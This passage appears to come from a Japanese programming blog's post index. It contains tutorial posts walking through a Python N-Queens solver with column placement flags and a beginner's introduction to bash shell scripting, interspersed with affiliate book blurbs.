そのためiが0,1,2の時は443行目の配置フラグの制約に引っかかりif文の中には入らず次のfor文に進みます。\n図 図 図 i=3では\nABOARD[3]=3で4行目の左端にクイーンを設置します。\n図 やっとフラグの制約に引っかからず443行のif文の中にはいれます。\nFA[3]=1\n444行目でFA[3]=1 で右から4番目の位置にフラグをたてます。\n445行目でnqueenを引数4を渡して呼び出して先に進みます。\n再帰呼び出しなのでrow=4の状態でメソッドの先頭435行目に移動します。\nrow=4なので438行目の if row == SIZE:の条件を満たします。\n439でprintout()メソッドを呼び出してCOUNT と各行のクイーンの設置場所を出力します。\nそして、再帰を抜け4行目の処理（row=3）に戻ります。\n戻る場所は445行目のすぐ下です。\nローカル変数は再帰を呼び出す直前の状態にもどっています。\nrow=3 i=3です。\n446行目でFA[3]=0 でフラグを落としています。\nグローバル変数は再帰からもどっても再帰を呼び出す直前の状態に自動的にはもどらないので明示的にフラグを落とす必要があります。\n446行目でフラグを落としたあと次のfor文に進むのですが、すでにi=3なのでfor文を抜けます。\nfor文を抜けると再帰を抜け3行目の処理(row=2)に戻ります。\nここではrow=4,row=3と立て続けに再帰をぬけrow=2に戻る形となります。\n戻る場所は445行目のすぐ下です。\nローカル変数は再帰を呼び出す直前の状態にもどっています。\n3行目はforは0,1,2まで進んでいました。\nrow=2 i=2です。\n446行目でFA[2]=0 でフラグを落としています。\nそして次のfor文に進みます。\ni=3で\nABOARD[2]=3で3行目の左端にクイーンを設置します。\n図 FAの状態を見てみると以下の通りです。\nFA[0]==1 FA[1]==1 FA[2]==0 FA[3]==0 FA[3]=0なのでif FA[i]==0:の条件を満たしてif 文の中に入ります。\n右から4列目にクイーンを置いているので444行目でFA[3]=1 でフラグをたてます。\n445行目でnqueenを引数3を渡して呼び出して先に進みます。\n再帰呼び出しなのでrow=3の状態でメソッドの先頭435行目に移動します。\nrow=3なので440行目の else: に移動します。\n441行目のfor文に入りi=0からスタートします。\nfor文の中で右端から左端へ順番にクイーンを置いていくことになりますが。\nすでに、1行目で右端、2行目で右から2番目、3行目で右から4番目にクイーンを設置しています。\nFAの状態を見てみると以下の通りです。\nFA[0]==1 FA[1]==1 FA[2]==0 FA[3]==1 そのためiが0,1の時は443行目の配置フラグの制約に引っかかりif文の中には入らず次のfor文に進みます。\n図 図 i=2では\nABOARD[3]=2で4行目の右から3列目にクイーンを設置します。\n図 やっとフラグの制約に引っかからず443行のif文の中にはいれます。\nFA[2]=1\n444行目でFA[2]=1 で右から3列目の位置にフラグをたてます。\n445行目でnqueenを引数4を渡して呼び出して先に進みます。\n再帰呼び出しなのでrow=4の状態でメソッドの先頭435行目に移動します。\nrow=4なので438行目の if row == SIZE:の条件を満たします。\n439でprintout()メソッドを呼び出してCOUNT と各行のクイーンの設置場所を出力します。\n細く動作をみていくとこんな感じになります。\nブルートフォースの時は無条件に再帰的にnqueenメソッドを呼び出し次の行にいっていましたが制約フラグを使うことによって無駄に深い階層にもぐっていくことを大分防止できていることがわかると思います。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-04T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/","title":"第4回 pythonでNQueen（エイトクイーン）配置フラグ（制約テスト高速化）（２）"},{"content":"配置フラグ（制約テスト高速化） 前回は全くアルゴリズムを使わないで全パターン１行に１つずつクイーンを設置するブルートフォース　力任せ探索でした。\nエイトクイーン(N=8)ですら凄く時間がかかることが体感できたかと思います。\n今回も解を出すまでには至りませんが、一つ進んで、配置フラグ（制約テスト高速化）を使いより効率よく解の候補を列挙する方法を説明したいと思います。\nエイトクイーン問題はクイーンの利き筋上下左右斜め８方向にクイーンを置けないという制約があるのですが、今回は「上下の制約」すなわち、同じ列にはクイーンを置けないという制約を配置フラグを使って追加してみます。\n例えば、\n1行目で右端にクイーンを置くと以降の行では右端にクイーンを置けなくなります。\n図 上の図だと2行目で1行目ですでにクイーンを置いている右端にクイーンを置こうとしているのでNGです。\n図 上の図は2行目は良いのですが3行目で1行目にすでにクイーンを置いている右端にクイーンを置こうとしているのでNGです。\n図 図 上の２つの図のように同じ列にクイーンを置かないパターンを探索します。\n配置フラグ（制約テスト高速化）を使って私の端末でエイトクイーン(N=8)を実行すると、0m0.554sかかります。ブルートフォースが3m7.321sかかったので360倍くらい速いですね。\nグローバル変数について それではプログラムについて説明していきましょう。\nプログラムソースは以下のURLにあります。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py02_nqueen.py\nプログラムの作りとしては前回のブルートフォースをベースにしてそこに配置フラグを追加したものとなりますので、ブルートフォースとの差異を説明していきたいと思います。\nまず、グローバル変数について説明します。\n今回も動作をわかりやすくするため419,420行目のMAXとSIZEを4に変更してみてください。\n423行目 配列 FA がグローバル変数として新しく追加されています。\n0 for i in range(SIZE) で0に初期化しています。\nどの列にクイーンを置いたかをフラグで管理します。\nFA[0]が右端,FA[1]が右端から2番目,FA[2]が右端から3番目,FA[3]が右端から4番目(左端)になります。\n例えば2列目にクイーンを置くとFA[1]=1にしてフラグを立てます。\nnqueenメソッドについて nqueenメソッドの作りも基本的に前回のブルートフォースと同じです。\n443行目〜446行目に配置フラグFAの処理が追加されているところが違う部分となります。\n442行目 ABOARD[row]=i でクイーンを設置します。\n前回のブルートフォースの場合は\n無条件で次の行でnqueen(row+1)で再帰的にnqueenを呼び出していました。 今回の配置フラグでは\n443行目 if FA[i] == 0: の条件を満たした場合だけ再帰的にnqueenを呼び出しています。\niは今回クイーンを置いた場所を意味します。\n444行目でクイーンを置いた列の配置フラグをあらかじめ1にしておきます。\n例えば以下の図の様な場合\n図 1行目では右端にクイーンを置くので、\n444行目の処理でFA[0]=1となります。\n2行目は右端から2番目にクイーンを置くので、\nFA[1]=1となります。\n3行目は右端にクイーンを置いているのでiは0です。\n443行目の if FA[i]== 0 : の判定で\nFA[0]は1ですので443行目から446行目の処理には入らず次のfor文に移動することになります。\nこの443,444,446行目の処理によってすでに同じ列にクイーンを置いている場合は下の行に行くのをやめるという動きを実現しています。\n446行目でFA[i]=0 という処理があります。\nこの処理は再帰の動きを理解する上で非常に重要な処理になります。\n再帰から戻ってきた時は445行目の下からスタートすることになります。\n再帰から戻ってきた時は変数の状態を再帰に入る直前の状態に戻す必要があります。\nローカル変数については特別にプログラムしないでも再帰前の状態に戻るのですが、グローバル変数は自分で設定しないと元に戻りません。\n再帰から戻ってきた時はiにクイーンを置かなかったことになるのですから\nFA[i]=0で明示的にフラグを落としてあげています。\n今回は配置フラグの全体的な流れを説明しました。次回は図で説明しながら実際の動きを追ってみましょう。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-03T15:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/","title":"第3回 pythonでNQueen（エイトクイーン）配置フラグ（制約テスト高速化）（１）"},{"content":"この記事はシェルスクリプトを４５分でざっくりマスターできるチュートリアルです。bashスクリプト「Hello, World」から、ifステートメントなどの条件分岐、while, for, untilループをはじめ、シェルスクリプトの効率的なデバッグ手法の紹介など、シェルスクリプトを網羅的かつ短時間で学習することができます。\n過去、bashの経験があり、久しぶりにbashを書く必要に迫られた人、他の言語でプログラム経験があり、bash独自の書き方をざっくりと思い出したい人は、このトピックを長め読むだけで、充分 bashを思い出せるはずです。\nこのトピックをざっくり読み流すとおよそ４５分でbashの構文を網羅的に理解することができます。\nでは次のトピックについて説明します。\nはじめてのシェルスクリプト このトピックでは、catコマンドでシェルの場所を確認後、スクリプトファイルの作成、echoコマンドを使用して「Hello,shellscript.」記述し、スクリプトファイルを実行可能にします。\nではまず、ターミナルに次のコマンドを入力します。\n$ cat /etc/shells 実行するとおおよそ次の出力となります。\n$ cat /etc/shells\n/bin/sh\n/bin/bash\n/sbin/nologin\n/usr/bin/sh\n/usr/bin/bash\n/usr/sbin/nologin\n$\nこのコマンドは、システムで利用可能なすべてのシェルを表示し、それらのいずれかを使用できます。\nこのタスクでシステムにbashシェルがあるかどうかを確認できました。bashのパスを知るには、ターミナルで「$ which bash」を実行します。\n$ which bash /usr/bin/bash $ ヒント このパスをシェバンといいます。シェルスクリプトを実行する「bash」のPATHは「/usr/bin/bash」であることがわかりました。このシェバンを、すべてのシェルスクリプトのページ先頭に書き込む必要があります。 シェバンをソースファイルの先頭行に書きます。\n#!/usr/bin/bash ではさっそく「helloScript.sh」ファイルに「Hello,shellscript.」を記述しましょう。内容は以下の通りです。\n#!/bin/bash echo \u0026#34;Hello,shellscript.\u0026#34;; ファイルを保存し、ターミナルに戻り、「ls」コマンドを実行してファイルの存在を確認します。「ls -la」を使用してファイルの詳細を取得することもできます。\nその結果は、次のようになります。\n$ ls helloScript.sh $ $ ls -la -rw-rw-r-- 1 suzuki suzuki 44 2月 2 18:30 helloScript.sh $ \u0026lsquo;rw-rw-r\u0026rsquo; は、ファイルの所有者が、ファイへの読み取り、および書き込み権限を持っていることを示します。\n読むことができる (Readable)\tr\t4\n書くことができる (Writable)\tw\t2\n実行することができる (eXecutable)\tx\t1\nなにもできない\t-\t0\n３つのブロックにわかれているのは、グループを示しています。\n自分 グループ\t他人\nxrw xrw xrw\n現在のhelloScript.shは -rw ですから、読むことと、書くことはできるものの、実行する権限がないようです。\nこのスクリプトを実行可能にするには、ターミナルで次のコマンドを実行する必要があります。\n$ chmod +x helloScript.sh 次に、「ls -la」コマンドを使用して「helloScript.sh」ファイルのアクセス許可を確認し、次の出力が得られます。\n$ ls -la -rwxrwxr-x 1 suzuki suzuki 44 2月 2 18:30 helloScript.sh $ 実行権限が付きました。\n次に、ターミナルのコマンド「$ bash /helloScript.sh」を使用してファイルを実行します。\n$ ./helloScript.sh Hello, shell script. $ ヒント ファイルの実行方法はざっくりと２種類あります。 $ chmod +x \u0026lt;ファイル名\u0026gt; で、実行権限を与えたうえで、 $ ./\u0026lt;ファイル名\u0026gt; とする方法。 ファイルに実行権限を与えずに\n$ bash \u0026lt;ファイル名\u0026gt; と、する方法です。 セキュリティ的には後者が望ましいです。\n理由は、悪意を持つ第三者、または誤操作によってスクリプトファイルが簡単に実行できてしまう環境を作るべきではないからです。 何のファイルかわかりもせずに　$ ./\u0026lt;ファイル名\u0026gt; で実行できてしまうのは恐怖です。 実行する場合、ソースの中身を確認するのはもちろんですが、実行権限を軽率に与えることは控えましょう。 ファイルへの出力 このトピックでは、シェルスクリプトの実行結果を、別のファイルに出力する方法を紹介します。「helloScript.sh」の echo 行の末尾に少し追記するだけです。\n#!/bin/bash echo \u0026#34;Hello, shell script.\u0026#34; \u0026gt; hello.txt; ファイルを保存し、「$ bash helloScript.sh」でスクリプトを実行します。\n次の出力が表示されます。「ls -la」を押して、新しいファイルが存在することを確認してください。\n$ ls -la helloScript.sh hello.txt $ ヒント 「\u0026gt;」をリダイレクトと言います。 ファイルの出力は２種類あります。\nリダイレクト出力は、新規に空のファイルを作成したうえで文字を出力します。\nもう一つの出力方法は「アペンド \u0026raquo; 」です。\nアペンドは、既に存在するファイルに追記します。\n追記方法は簡単で、\u0026raquo; を使うだけです。\n#!/bin/bash echo \u0026#34;Hello, shell script.\u0026#34; \u0026gt; hello.txt; echo \u0026#34;and bash.\u0026#34; \u0026gt;\u0026gt; hello.txt; # ここで追記 ヒント 「\u0026raquo;」をアペンドと言います。 アペンドするときの注意点は、アペンドする場合は、既にファイルが存在している必要があります。「touch」コマンドでファイルを生成したうえでアペンドするか、あらかじめ「\u0026gt; リダイレクト」でファイルを生成し、文字列を追記したうえで、「\u0026raquo; アペンド」します。 コメント コメントはスクリプトの実行時に無視されます。スクリプトでは、コメントは何もしません。コメントには３つの種類があります。\n1行のコメント\n複数行のコメント\nHereDoc Delimeter\n1行のコメントの場合、コメントステートメントの前に「#」記号を半角で書きます。\n#!/bin/bash # this is a 1st comment echo \u0026#34;Hello,shellscript.\u0026#34; \u0026gt; file.txt; コメントを複数行にわたって書きたいことがあります。行頭に「# 」を書けばよいのですが、改行の度に行頭に「# 」を挿入する必要があり、とっても面倒です。\nC 言語やJava、HTMLですらも複数行コメントがあるのに。。。\nシェルスクリプトにもあります。あるんです。みんな知らないだけです。\n最初のコメントの先頭の前に「: \u0026lsquo;」を置き、最後のコメントの後に「\u0026rsquo;」と書くことだけです。理解を深めるために、次のスクリプトを調べることができます。\nヒント 「:」と「\u0026rsquo;」の間は半角スペースを入れます。 #!/bin/bash : \u0026#39; This is the segment of multi-line comments Through this script, you will learn How to do multi-line commenting \u0026#39; # this is a 1st comment echo \u0026#34;Hello,shellscript.\u0026#34; \u0026gt; file.txt 仰々しいマルチラインコメントもあります。\nこちらのマルチラインコメントが使われない理由は、これから紹介するヒアドキュメントの記述方法に似ていてまぎらわしいからです。\n#!/bin/bash # 仰々しいマルチラインコメント \u0026lt;\u0026lt;COMMENT your comment 1 comment 2 blah COMMENT # シンプルなマルチラインコメント : \u0026#39; This is the segment of multi-line comments Through this script, you will learn How to do multi-line commenting \u0026#39; # this is a 1st comment echo \u0026#34;Hello,shellscript.\u0026#34; \u0026gt; file.txt; ヒント 「:」と「\u0026rsquo;」の間は半角スペースを入れます。 ヒアドキュメントはとてもべんりな出力方法です。\nコメントではありませんが、上記のマルチラインコメントと似ているので、ここでご紹介します。\n通常、複数の行出力は以下のように記述します。\n#!/bin/bash touch file.txt; echo \u0026#34;Hello,shellscript 1.\u0026#34; \u0026gt;\u0026gt; file.txt; echo \u0026#34;Hello,shellscript 2.\u0026#34; \u0026gt;\u0026gt; file.txt; echo \u0026#34;Hello,shellscript 3.\u0026#34; \u0026gt;\u0026gt; file.txt; とっても面倒ですね。\nそこでヒアドキュメントの出番となります。ヒアドキュメントでは以下のように書くことができます。\n#!/bin/bash cat \u0026lt;\u0026lt; EOS Hello,shellscript 1. Hello,shellscript 2. Hello,shellscript 3. EOS スクリプトを実行すると、次の出力が表示されます。\n$ bash hereDocuments.sh Hello,shellscript 1. Hello,shellscript 2. Hello,shellscript 3. $ cat の後ろに 「 - ハイフン」を置くと、インデントが有効になります。\n#!/bin/bash cat \u0026lt;\u0026lt;-EOS Hello,shellscript 1. Hello,shellscript 2. Hello,shellscript 3. EOS スクリプトを実行すると、次の出力が表示されます。\n$ bash hereDocuments.sh Hello,shellscript 1. Hello,shellscript 2. Hello,shellscript 3. $ ヒント cat \u0026laquo;-EOS (-)ハイフンを置くtipsを忘れずに。 条件分岐 このトピックでは以下について説明します。\nifステートメント\nif-elseステートメント\nif-else ifステートメント\nAND演算子とOR演算子\nIfステートメント ifセグメントに条件を書き込むには、条件の前後に「[ ]」内に余分なものを与える必要があります。その後、条件コードを述べ、次の行に移動し、「その後」と書き、条件がtrueの場合に実行するコード行を述べます。最後に、ifステートメントを閉じるには「fi」を使用します。以下は、ifステートメントの構文を理解するスクリプトコードの例です。\nifステートメントには「[ ]」内に条件を書きます。\n「if」と 「[」の間には半角スペースが必要です。\nまた、「[」と条件文、条件文と「]」の間にも半角スペースが必要です。\nifの終わりには、「fi」で閉じる必要があります。\n#!/bin/bash count=10; if [ \u0026#34;$count\u0026#34; -eq 10 ]; then echo \u0026#34;the condition is true\u0026#34;; fi このスクリプトは変数「カウント」に「10」の値を割り当てます。\n「if」の条件「[ \u0026ldquo;$count\u0026rdquo; -eq 10 ]」は、count変数の値が10と「等しい」かどうかを確認する条件文です。\nこの条件がtrueで成立すると、処理は次のステートメントに移動します。\n最後の「fi」は、このif-statementブロックの終了を示すキーワードです。\n条件が成立しない場合、このプログラムには「else」ブロックがないため、何もしません。\n次のプログラムは条件が成立しない場合の処理となります。\n#!/bin/bash count=11; # COUNT は 11とする if [ \u0026#34;$count\u0026#34; -eq 10 ]; then echo \u0026#34;the condition is true\u0026#34;; else echo \u0026#34;the condition is false. count: $count\u0026#34;; fi このプログラムでは、「$count」変数は11の値で割り当てています。\nこの場合、ifブロックの条件が成立しないため、「if」セクション全体を無視して「else」ブロックに移動します。\n端末は、条件がfalseであるというステートメントと$countを表示します。\n条件を書くための別の形式もあります。\n「[ ]」を「(( ))」括弧に置き換え、それらの間に条件を書き込むだけです。\nC言語、Javaに慣れている人は、この記述方法のほうが直観的かもしれません。\nこの形式の例を次に示します。\n#!/bin/bash count=11; # COUNT は 11とする if ((count==10)); then echo \u0026#34;the condition is true\u0026#34;; else echo \u0026#34;the condition is false count: $count\u0026#34;; fi if-else ifステートメント スクリプトでif-else ifをステートメントのブロックとして使用すると、プログラムは条件を再チェックします。同様に、以下のサンプルコードを「helloScript.sh」に記述すると、プログラムは最初に「if」条件をチェックすることがわかります。「カウント」変数には「10」の値が割り当てられます。最初の「if」条件では、プログラムは「カウント」が9より大きい値を持っていることを確認します。その後、「if」ブロックに書かれたステートメントが実行され、そこから出てきます。たとえば、「elif」で書かれた条件がtrueの場合、プログラムは「elif」ブロックで書かれたステートメントのみを実行し、ステートメントの「if」および「else」ブロックを無視します。\n#!/bin/bash count=8; if ((count\u0026gt;9)); then echo \u0026#34;the first condition is true\u0026#34;; elif ((count\u0026lt;=9)); then echo \u0026#34;then second condition is true\u0026#34;; else echo \u0026#34;the condition is false\u0026#34;; fi AND演算子 条件で「AND」演算子を使用するには、条件間で記号「\u0026amp;\u0026amp;」を使用します。\nたとえば、「[ \u0026ldquo;$age\u0026rdquo; -gt 18 ] と [ \u0026ldquo;$age\u0026rdquo; -lt 40 ]をチェックし、年齢が18より大きく、年齢が40未満の場合、これはfalseであることがわかります。プログラムは「その後」の後に書かれたステートメントを無視し、端末に「年齢は正しくない」と印刷して「else」ブロックに向かって移動します\n#!/bin/bash age=10 if [ \u0026#34;$age\u0026#34; -gt 18 ] \u0026amp;\u0026amp; [ \u0026#34;$age\u0026#34; -lt 40 ]; then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi 条件を次の形式で書くこともできます。\n#!/bin/bash age=30 if [[ \u0026#34;$age\u0026#34; -gt 18 \u0026amp;\u0026amp; \u0026#34;$age\u0026#34; -lt 40 ]] then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi 「\u0026amp;\u0026amp;」の代わりに「-a」を使用して、プログラムの条件でAND演算子を使用することもできます。それは同じように動作します。\n#!/bin/bash age=30 if [ \u0026#34;$age\u0026#34; -gt 18 -a \u0026#34;$age\u0026#34; -lt 40 ] then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi このコードを「helloScript.sh」スクリプトに保存し、ターミナルから実行します\nOR演算子 2つの条件があり、それらのいずれかまたは両方がtrueの場合、前述のステートメントを実行する場合、OR演算子が使用されます。 「-o」はOR演算子を表すために使用されます。「||」記号を使用することもできます。\n次のサンプルコードを「helloScript.sh」に書き、ターミナルから実行して動作を確認します。\n#!/bin/bash age=30 if [ \u0026#34;$age\u0026#34; -gt 18 -o \u0026#34;$age\u0026#34; -lt 40 ]; then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi OR演算子をよりよく理解するために、さまざまな条件を試すこともできます。以下に４つのサンプルを記します。\n#!/bin/bash age=30 if [ \u0026#34;$age\u0026#34; -lt 18 -o \u0026#34;$age\u0026#34; -lt 40 ]; then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi #!/bin/bash age=30 if [ \u0026#34;$age\u0026#34; -lt 18 -o \u0026#34;$age\u0026#34; -gt 40 ]; then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi #!/bin/bash age=30 if [[ \u0026#34;$age\u0026#34; -lt 18 || \u0026#34;$age\u0026#34; -gt 40 ]]; then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi #!/bin/bash age=30 if [ \u0026#34;$age\u0026#34; -lt 18 ] || [ \u0026#34;$age\u0026#34; -gt 40 ]; then echo \u0026#34;age is correct\u0026#34; else echo \u0026#34;age is not correct\u0026#34; fi ループ このトピックでは、以下の説明をします。\nwhileループ\nuntil ループ\nfor ループ\nbreak と continue\nwhileループ: ループは条件がtrueの場合にコードブロック(do\u0026hellip;doneで囲まれています)を実行し、条件がfalseになるまでそれを実行し続けます。\n条件がfalseになると、whileループは終了します。\nwhileループは、キーワード「while」から始まり、そのうしろに条件文を書きます。\n条件文を閉じたらキーワード「do」を使用し、プログラムの条件がtrueの場合に実行する処理ステートメントの束を書きます。\n処理ステートメントの終了後、キーワード「done」を書いてwhileループを閉じます。\n以下、スクリプトを「helloScript.sh」として保存します。\n#!/bin/bash number=1; while [ $number -lt 10 ]; do echo \u0026#34;$number\u0026#34;; number=$(( number+1 )); done ターミナルで「$ 